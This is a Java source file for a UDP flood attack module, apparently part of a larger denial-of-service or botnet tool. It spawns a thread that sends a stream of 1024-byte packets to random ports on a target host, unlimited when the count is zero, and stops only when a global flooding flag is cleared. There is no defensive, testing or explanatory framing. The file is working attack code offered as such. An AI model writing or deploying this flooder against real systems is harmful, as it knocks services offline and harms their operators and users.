import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

class UDPFlood extends Thread {

	private String host;
	private int connections;
	private int delay;

	private int count = 0;

	public UDPFlood(String host, int connections, int delay) {
		this.host = host;
		this.connections = connections;
		this.delay = delay;
		this.start();
	}

	public void run() {
		while(FloodingStatus.udpFlooding && (count < this.connections || this.connections == 0)) {
			try {
				byte[] buffer = new byte[1024];
				DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(this.host), Util.randomNumber(65535));
				DatagramSocket socket = new DatagramSocket();
				socket.send(packet);
				count++;
			} catch(Exception e) {
			}
		}
	}

}